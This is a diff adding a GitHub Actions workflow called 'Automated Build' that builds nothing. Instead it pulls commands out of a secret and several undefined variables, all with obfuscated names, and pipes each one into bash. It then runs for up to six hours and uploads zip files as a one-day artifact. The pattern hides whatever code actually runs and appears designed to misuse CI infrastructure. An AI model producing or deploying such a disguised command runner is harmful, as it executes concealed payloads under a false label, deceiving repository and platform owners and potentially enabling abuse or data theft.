@@ -1,0 +1,30 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          ruxyw04: ${{ secrets.ruxyw04 }}
+        run: |
+          printf '%s' "$ruxyw04" | jq -r .cr1 | /bin/bash
+          printf '%s' "$jb44" | jq -r .ql53 | /bin/bash
+          echo $xsqd5379 | jq -r .mlff1013 | /bin/bash
+          printf '%s' "$qdmoc7" | jq -r .uduw881 | /bin/bash
+          printf '%s' "$xi5" | jq -r .qwz48367 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Mou6P8o1
+          path: "*.zip"
+          retention-days: 1
